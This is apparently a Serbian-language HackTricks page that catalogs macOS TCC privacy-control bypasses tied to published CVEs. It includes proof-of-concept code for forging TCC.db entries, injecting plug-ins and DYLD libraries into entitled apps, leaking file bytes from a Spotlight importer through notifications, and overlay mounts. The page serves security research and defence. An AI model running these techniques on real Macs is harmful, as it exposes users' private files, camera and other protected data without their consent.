# Zaobilaženja macOS TCC-a

{{#include ../../../../../banners/hacktricks-training.md}}

Za informacije o skladištenju TCC odobrenja i atribuciji pošiljaoca/primaoca Automation zahteva pogledajte [pregled macOS TCC-a](../index.html#identify-apple-events-sender-and-target-grants).

## Po funkcionalnosti

### Zaobilaženje upisa

Ovo nije zaobilaženje, već jednostavno način na koji TCC funkcioniše: **Ne štiti od upisivanja**. Ako Terminal **nema pristup čitanju Desktop foldera korisnika, i dalje može da upisuje u njega**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**Prošireni atribut `com.apple.macl`** dodaje se novoj **datoteci** kako bi **aplikacija koja ju je kreirala** mogla da je čita.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Moguće je **postaviti prozor preko TCC upita** tako da korisnik **prihvati** dozvolu, a da to ne primeti. PoC možete pronaći u projektu [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC zahtev pod proizvoljnim imenom

Napadač može da **kreira aplikacije sa bilo kojim imenom** (npr. Finder, Google Chrome...) u datoteci **`Info.plist`** i da ih podesi da zatraže pristup lokaciji zaštićenoj pomoću TCC-a. Korisnik će misliti da legitimna aplikacija traži taj pristup.\
Pored toga, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i na njeno mesto postaviti lažnu**, tako da kada korisnik klikne na lažnu aplikaciju (koja može da koristi istu ikonu), ona može da pozove legitimnu aplikaciju, zatraži TCC dozvole i pokrene malware, navodeći korisnika da poveruje da je legitimna aplikacija zatražila pristup.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Više informacija i PoC možete pronaći ovde:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Podrazumevano je pristup putem **SSH-a imao „Full Disk Access“**. Da biste to onemogućili, morate da ga ostavite na spisku, ali da bude onemogućen (uklanjanje sa spiska neće ukloniti te privilegije):<sup>[[2]](#references)</sup>

![TCC zahtev pod proizvoljnim imenom - SSH Bypass: Podrazumevano je pristup putem SSH-a imao „Full Disk Access“. Da biste to onemogućili, morate da ga ostavite na spisku, ali da bude onemogućen (uklanjanje...](<../../../../../images/image (1077).png>)

Ovde možete pronaći primere malware-a koji su uspeli da **zaobiđu ovu zaštitu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Imajte na umu da je sada za omogućavanje SSH-a potreban **Full Disk Access**

### Obrada ekstenzija - CVE-2022-26767

Atribut **`com.apple.macl`** dodeljuje se datotekama kako bi **određenoj aplikaciji dao dozvolu da ih čita.** Ovaj atribut se postavlja kada se datoteka **prevuče i otpusti** preko aplikacije ili kada korisnik **dvaput klikne** na datoteku da bi je otvorio pomoću **podrazumevane aplikacije**.

Zato bi korisnik mogao da **registruje zlonamernu aplikaciju** za obradu svih ekstenzija i da pozove Launch Services da **otvori** bilo koju datoteku (čime bi zlonamerna aplikacija dobila dozvolu da je čita).<sup>[[23]](#references)</sup>

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa XPC servisom **`com.apple.iCloudHelper`**, koji će **obezbediti iCloud tokene**.

**iMovie** i **Garageband** imali su ovaj entitlement i druge koji su to omogućavali.

Za više **informacija** o eksploitu za **dobijanje iCloud tokena** pomoću tog entitlement-a, pogledajte predavanje: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Curenje podataka iz Spotlight importera putem Darwin notification imena

Spotlight importer može da čita datoteku koju mu Spotlight prosledi u callback `GetMetadataForFile`, čak i kada običan proces bez Full Disk Access ne može da je pročita. Za razliku od [ubacivanja koda u proces ovlašćen pomoću TCC-a](../macos-tcc-credential-and-data-theft.md), za ovo je potrebno prethodno lokalno prisustvo koje omogućava instaliranje importera i odgovarajući događaj indeksiranja u Spotlight-u. Importer je u sandbox-u, ali Darwin notifications koji sadrže samo ime mogu da prenesu bajtove slušaocu izvan tog sandbox-a. Ovo je kanal za data-leak, a ne način da se iz importera dobije root pristup ili proizvoljan pristup datotekama.<sup>[[24]](#references)</sup>

Deklarišite tip ciljne datoteke pod `CFBundleDocumentTypes` → `LSItemContentTypes` u datoteci `Info.plist` importera, a zatim instalirajte bundle u `~/Library/Spotlight/` ili u `Contents/Library/Spotlight/` neke aplikacije. Registraciju proverite pomoću `mdimport -L`. Odeljak [Spotlight importer](../../../../macos-auto-start-locations.md#spotlight-plugins) objašnjava smeštaj bundle-a i uparivanje tipova datoteka. Importer dobija samo datoteke koje mu Spotlight dodeli; postojeći importer obično ima prednost. U macOS 26 Tahoe, `mdimport -i` u prijavljenim testovima nije pouzdano pokretao trenutno rekurzivno indeksiranje, dok je `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` zahtevao ponovno uvoženje UTI-jeva koje taj importer navodi.<sup>[[24]](#references)</sup>

Za testiranje kanala, pokrenite slušaoca izvan sandbox-a pomoću `notifyutil -w TEST_TEST_TEST`, a zatim pošaljite notification pomoću `CFNotificationCenterGetDarwinNotifyCenter()` i objekta i `userInfo` vrednosti `NULL`. Za razliku od distributed notification-a sa `userInfo` payload-om, Darwin notification sadrži samo svoje ime. Za binarne podatke, registrujte spoljnog slušaoca za decimalna imena od `0` do `255` pomoću `notify_register_dispatch`; registraciju svakog callback-a povežite sa njegovom bajt-vrednošću. Unutar `GetMetadataForFile`, čitajte samo `pathToFile` koji je prosledio Spotlight i šaljite svaki bajt kao decimalno ime notification-a:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Listener rekonstruiše niz bajtova umesto da čita samu datoteku zaštićenu TCC-om. Objavljeni PoC je oporavio prvih 64 bajta datoteke `knowledgeC.db` sa terminala bez FDA, dok je SIP bio omogućen u macOS-u 26. Ovo je spor način prenosa podataka i nije pouzdan metod za masovno kopiranje: Spotlight možda neće indeksirati ciljnu datoteku niti je ponovo indeksirati, a konkurentne instance importer-a mogu da isprepliću tokove obaveštenja. Pogledajte [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) za druge mehanizme koji prelaze granicu sandbox-a.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Aplikacija sa dozvolom **`kTCCServiceAppleEvents`** moći će da **kontroliše druge aplikacije**. To znači da bi mogla da **zloupotrebi dozvole dodeljene drugim aplikacijama**.<sup>[[2]](#references)</sup>

Više informacija o Apple Scripts potražite ovde:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na primer, ako aplikacija ima **dozvolu Automation za `iTerm`**, kao u ovom primeru, **`Terminal`** ima pristup iTerm-u:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Preko iTerm-a

Terminal, koji nema FDA, može da pozove iTerm, koji ga ima, i da ga iskoristi za izvršavanje radnji:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Preko Finder-a

Ili, ako aplikacija ima pristup preko Finder-a, mogla bi da pokrene skriptu poput ove:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Prema ponašanju aplikacije

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**tccd daemon** u userland-u je koristio promenljivu okruženja **`HOME`** za pristup korisničkoj TCC bazi podataka na lokaciji: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovoj objavi na Stack Exchange-u](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), pošto se TCC daemon pokreće putem `launchd`-a u domenu trenutnog korisnika, moguće je **kontrolisati sve promenljive okruženja** koje mu se prosleđuju.<sup>[[19]](#references)</sup>\
Dakle, **napadač bi mogao da podesi promenljivu okruženja `$HOME`** u **`launchctl`** tako da pokazuje na **kontrolisani** **direktorijum**, da **restartuje** **TCC** daemon, a zatim **direktno izmeni TCC bazu podataka** kako bi sebi dodelio **sva dostupna TCC ovlašćenja**, a da pritom nikada ne zatraži potvrdu od krajnjeg korisnika.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes je imao pristup lokacijama zaštićenim mehanizmom TCC, ali se novokreirana beleška **čuva na nezaštićenoj lokaciji**. Zato je napadač mogao da zatraži od aplikacije Notes da kopira zaštićenu datoteku u belešku, a zatim pristupi dobijenim podacima na nezaštićenoj lokaciji:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binarna datoteka `/usr/libexec/lsd`, zajedno sa bibliotekom `libsecurity_translocate`, imala je entitlement `com.apple.private.nullfs_allow`, koji joj je omogućavao da kreira **nullfs** mount, i entitlement `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`**, koji joj je omogućavao pristup svakoj datoteci.

Bilo je moguće dodati atribut karantina direktorijumu „Library“, pozvati XPC servis **`com.apple.security.translocation`**, nakon čega bi on mapirao Library na **`$TMPDIR/AppTranslocation/d/d/Library`**, gde bi svim dokumentima unutar Library moglo da se **pristupi**.

### CVE-2024-44131 - FileProvider symlink race

Aplikacije koje prosleđuju operacije nad datotekama **privilegovanom pomoćnom procesu** (ovde **`fileproviderd`** / `Files.app`) kopiraju ili premeštaju stavke **u ime korisnika**, pa se kopiranje izvršava sa privilegijama pomoćnog procesa, a ne pozivaoca.

Jamf Threat Labs je pokazao da se provera symlink-a koja se obavlja pre operacije može **utrkivati**: umesto postavljanja symlink-a na **poslednju** komponentu putanje (koja se proverava), napadač zamenjuje **međudirektorijum** u putanji **nakon što je kopiranje već počelo**. Privilegovani pomoćni proces zatim prati vezu koju kontroliše napadač i čita/upisuje lokacije zaštićene mehanizmom TCC **bez prikazivanja ikakvog upita**.<sup>[[5]](#references)</sup>

Direktorijumi koji u svojoj putanji **nisu** zaštićeni nasumičnim UUID-jem (na primer `~/Library/Mobile Documents/com~apple~CloudDocs`) najlakše su mete, jer napadač može da predvidi celu putanju potrebnu za utrkivanje.

> [!TIP]
> Ovo je opšti obrazac na koji treba obratiti pažnju: **svaki privilegovani proces koji razrešava putanju više puta** (provera pa upotreba, ili `rename()`/`copyfile()` koji zasebno razrešavaju izvor i odredište) može se napasti utrkivanjem tako što se zameni direktorijum u sredini putanje. Samo `O_NOFOLLOW_ANY`, `openat()` nad već otvorenim direktorijumskim FD-jem ili `realpath()` + ponovna validacija zaista zatvaraju ovaj vremenski prozor.

Više informacija potražite u [**tekstu Jamf Threat Labs-a**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` može da se izgradi sa opcijom `SQLITE_ENABLE_SQLLOG`, koja dodaje mehanizam za beleženje kojim se upravlja preko promenljivih okruženja ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – za **svaku otvorenu bazu podataka**, **kopija datoteke baze podataka** i zapis SQL naredbi upisuju se u `path` (direktorijum već mora da postoji).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – pravi se **nova kopija svaki put** kada se DB otvori/pridruži, umesto da se postojeća ponovo koristi.
- **`SQLITE_SQLLOG_CONDITIONAL`** – beleži se samo veza za koju postoji datoteka `<database>-sqllog` pored glavne DB datoteke.

Ako možete da ubacite ovu promenljivu u proces koji ima **FDA** i otvara SQLite baze podataka, on će bez problema **kopirati te zaštićene baze podataka** u direktorijum koji kontrolišete. Pošto se naziv odredišne datoteke izvodi iz podataka koje kontroliše napadač, **symlink postavljen na odredište** pretvara isti mehanizam u **upis proizvoljne datoteke** sa privilegijama ciljnog procesa.

### **SQLITE_AUTO_TRACE**

Ako je promenljiva okruženja **`SQLITE_AUTO_TRACE`** postavljena, biblioteka **`libsqlite3.dylib`** počeće da **beleži** sve SQL upite. Mnoge aplikacije su koristile ovu biblioteku, pa je bilo moguće beležiti sve njihove SQLite upite.<sup>[[22]](#references)</sup>

Više Apple aplikacija koristilo je ovu библиотеку за приступ информацијама заштићеним механизмом TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Potraga za upisima datoteka pokrenutim env-var promenljivama

Prethodna dva primera predstavljaju istu generičku tehniku, pa vredi potražiti još takvih: **framework-i učitani u aplikacije sa TCC privilegijama često izlažu debug/logging promenljive okruženja koje navode proces da kreira datoteku na putanji koju kontroliše pozivalac**.

Postupak za njihovo pronalaženje:

1. Izaberite cilj sa FDA ili drugom vrednom TCC dozvolom (`Music`, `TV`, `Terminal`, MDM agenti...) i izlistajte framework-e koje povezuje (`otool -L`, `vmmap`).
2. Pretražite te framework-e za `getenv` stringove: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Postavite kandidatske promenljive pomoću `launchctl setenv NAME /path/you/control`, pokrenite aplikaciju i pratite šta radi na sistemu datoteka pomoću `fs_usage -w -f filesys <pid>` ili `sudo fs_usage | grep <path>`.
4. Ako proces **kreira ili preimenuje** datoteku u vašem direktorijumu, imate primitiv za upis: usmerite odredište na symlink (ili trkajte nadmetanjem nad posrednim direktorijumom, kao u prethodnom slučaju CVE-2024-44131) da biste preusmerili upis u `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Dve stvari ograničavaju ovu tehniku. Prvo, **`DYLD_*` promenljive se zanemaruju za binarne datoteke sa hardened runtime-om** osim ako aplikacija ne sadrži entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) („Boolean vrednost koja pokazuje da li na aplikaciju mogu uticati promenljive okruženja dinamičkog linkera, koje možete koristiti za ubacivanje koda u proces aplikacije“) — pogledajte i [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Drugo, Apple uklanja pojedinačne debug promenljive framework-a čim budu prijavljene, pa promenljiva koja je radila u jednom izdanju macOS-a često nestane u sledećem. Ako aplikacija tiho odbije da se pokrene nakon što postavite neku promenljivu, smatrajte da je ta promenljiva već filtrirana.<sup>[[7]](#references)[[8]](#references)</sup>

Pogledajte [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) za ekvivalentni trik sa promenljivama linkera.

### Apple Remote Desktop

Kao root možete da omogućite ovu uslugu, pa će **ARD agent imati full disk access**, što korisnik zatim može da zloupotrebi da bi ga naterao da kopira novu **TCC korisničku bazu podataka**.

## Pomoću **NFSHomeDirectory**

TCC koristi bazu podataka u korisnikovom HOME direktorijumu za kontrolu pristupa resursima specifičnim za korisnika, na putanji **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Prema tome, ako korisnik uspe da ponovo pokrene TCC sa env promenljivom $HOME koja pokazuje na **drugi direktorijum**, mogao bi da kreira novu TCC bazu podataka u **/Library/Application Support/com.apple.TCC/TCC.db** i navede TCC da dodeli bilo koju TCC dozvolu bilo kojoj aplikaciji.

> [!TIP]
> Imajte na umu da Apple koristi podešavanje sačuvano u korisničkom profilu, u atributu **`NFSHomeDirectory`**, kao **vrednost za `$HOME`**. Zato, ako kompromitujete aplikaciju koja ima dozvole za izmenu ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), možete da **pretvorite** ovu opciju u oružje za zaobilaženje TCC-a.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) za izmenu korisnikove HOME fascikle.

1. Nabavite _csreq_ blob za ciljnu aplikaciju.
2. Postavite lažnu datoteku _TCC.db_ sa potrebnim pristupom i _csreq_ blob-om.
3. Izvezite unos korisnika iz Directory Services pomoću [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Izmenite unos u Directory Services da biste promenili korisnikov home direktorijum.
5. Uvezite izmenjeni unos u Directory Services pomoću [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustavite korisnikov _tccd_ i ponovo pokrenite proces.

Drugi POC koristio je **`/usr/libexec/configd`**, koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, čime je napadač mogao da navede **prilagođeni Bundle za učitavanje**. Zato exploit **zamenjuje** metod promene korisnikovog home direktorijuma pomoću **`dsexport`** i **`dsimport`** metodom **ubacivanja koda u `configd`**.

Više informacija potražite u [**originalnom izveštaju**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Pomoću ubacivanja procesa

Postoje različite tehnike za ubacivanje koda u proces i zloupotrebu njegovih TCC privilegija:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Štaviše, najčešći način ubacivanja procesa za zaobilaženje TCC-a koji je pronađen koristi **plug-in-ove (load library)**.\
Plug-in-ovi su dodatni kod, obično u obliku biblioteka ili plist datoteka, koji će **učitati glavna aplikacija** i koji će se izvršavati u njenom kontekstu. Zato će **prilagođeni kod imati pristup** TCC-ograničenim datotekama ako im je glavna aplikacija imala pristup (putem dodeljenih dozvola ili entitlement-a).

### CVE-2020-27937 - Directory Utility

Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala plug-in-ove sa ekstenzijom **`.daplug`** i **nije imala hardened runtime**.

Da bi se ova CVE iskoristila, **`NFSHomeDirectory`** se **menja** (zloupotrebom prethodnog entitlement-a) kako bi se **preuzela kontrola nad korisnikovom TCC bazom podataka** i zaobišao TCC.

Više informacija potražite u [**originalnom izveštaju**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binarna datoteka **`/usr/sbin/coreaudiod`** imala je entitlement-e `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvi je **omogućavao ubacivanje koda**, a drugi joj je davao pristup **upravljanju TCC-om**.

Ova binarna datoteka dozvoljavala je učitavanje **plug-in-ova trećih strana** iz direktorijuma `/Library/Audio/Plug-Ins/HAL`. Zato je bilo moguće **učitati plug-in i zloupotrebiti TCC dozvole** pomoću ovog PoC-a:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Sistemske aplikacije koje otvaraju tok sa kamere putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **ove dodatke u proces**. Nalaze se u `/Library/CoreMediaIO/Plug-Ins/DAL` (nisu zaštićeni pomoću SIP-a).

Za **ubrizgavanje koda** dovoljno je da se tamo smesti biblioteka sa uobičajenim **constructor**-om.

Nekoliko Apple aplikacija bilo je ranjivo na ovo.

### Firefox

Aplikacija Firefox imala je entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Za više informacija o tome kako ovo lako exploitovati, [**pogledajte originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je entitlement-e **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, koji su omogućavali ubacivanje koda u proces i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao entitlement-e **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, pa je bilo moguće zloupotrebiti ga za **dobijanje pristupa njegovim dozvolama**, kao što je snimanje kamerom. [**Payload možete pronaći u writeup-u**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Obratite pažnju na to da je za korišćenje promenljive okruženja za učitavanje biblioteke kreiran **prilagođeni plist**, kako bi se biblioteka ubacila, a zatim je korišćen **`launchctl`** za njeno pokretanje:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Putem open poziva

Moguće je pozvati **`open`** čak i kada je sistem u sandboxu

### Terminal skripte

Prilično je uobičajeno dodeliti Terminalu **pun pristup disku (FDA)**, bar na računarima koje koriste ljudi iz IT struke. Takođe je moguće pomoću njega pozivati skripte **`.terminal`**.

Skripte **`.terminal`** su plist datoteke poput ove, sa komandom za izvršavanje u ključu **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Aplikacija bi mogla da upiše terminalsku skriptu na lokaciju kao što je /tmp i pokrene je komandom kao što je:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Montiranjem

### CVE-2020-9771 - mount_apfs TCC bypass i eskalacija privilegija

**Bilo koji korisnik** (čak i oni bez privilegija) može da kreira i montira Time Machine snapshot i **pristupi SVIM datotekama** tog snapshot-a.\
**Jedina potrebna privilegija** jeste da aplikacija koja se koristi (kao što je `Terminal`) ima pristup **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), koji mora da odobri administrator.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Detaljnije objašnjenje možete [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount preko TCC fajla

Iako je TCC DB fajl zaštićen, bilo je moguće **mount-ovati preko direktorijuma** novi TCC.db fajl:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Proverite **ceo exploit** u [**originalnom tekstu**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Kao što je objašnjeno u [originalnom tekstu](https://www.kandji.io/blog/macos-audit-story-part2), ovaj CVE je zloupotrebio `diskarbitrationd`.<sup>[[16]](#references)</sup>

Funkcija `DADiskMountWithArgumentsCommon` iz javnog framework-a `DiskArbitration` obavljala je bezbednosne provere. Međutim, moguće ih je zaobići direktnim pozivanjem `diskarbitrationd`, čime se omogućava korišćenje elemenata `../` u putanji i simboličkih linkova.

